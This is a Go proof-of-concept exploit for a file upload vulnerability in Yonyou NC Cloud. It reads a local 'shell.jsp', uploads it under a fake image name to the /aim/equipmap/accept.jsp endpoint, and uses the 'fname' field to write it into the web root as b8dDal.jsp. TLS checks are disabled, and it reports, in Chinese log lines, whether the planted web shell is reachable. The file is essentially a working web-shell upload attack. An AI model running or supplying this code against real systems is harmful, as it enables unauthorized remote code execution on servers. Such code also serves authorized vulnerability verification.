package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func NCAcceptUpload(target string) {
	url := strings.TrimRight(target, "/")
	filePath := "shell.jsp"
	content, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatal(err)
	}

	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	imageField, err := writer.CreateFormFile("file", "images.jpg")
	if err != nil {
		fmt.Println("Error creating form file:", err)
		return
	}
	imageField.Write(content)

	_ = writer.WriteField("fname", "/webapps/nc_web/b8dDal.jsp")

	writer.Close()

	req, err := http.NewRequest("POST", url+"/aim/equipmap/accept.jsp", &requestBody)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}

	defer resp.Body.Close()
	responseBody, _ := io.ReadAll(resp.Body)
	msg := regexp.MustCompile(`parent\.afterUpload\(1\)`).MatchString(string(responseBody))
	if resp.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在用友-NC-Cloud文件上传漏洞：", url+"/b8dDal.jsp")
	} else {
		log.Println("[-] 不存在用友-NC-Cloud文件上传漏洞")
	}
}
